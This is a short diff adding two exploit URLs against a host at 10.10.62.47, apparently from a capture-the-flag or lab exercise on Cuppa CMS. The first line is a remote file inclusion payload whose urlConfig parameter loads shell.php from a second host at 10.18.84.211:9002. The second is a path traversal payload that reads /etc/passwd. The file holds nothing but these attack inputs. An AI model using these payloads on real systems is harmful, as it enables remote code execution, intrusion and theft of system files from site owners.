@@ -1,0 +1,7 @@
+http://10.10.62.47/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.18.84.211:9002/shell.php
+
+
+
+http://10.10.62.47/45kra24zxs28v3yd/administrator/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+
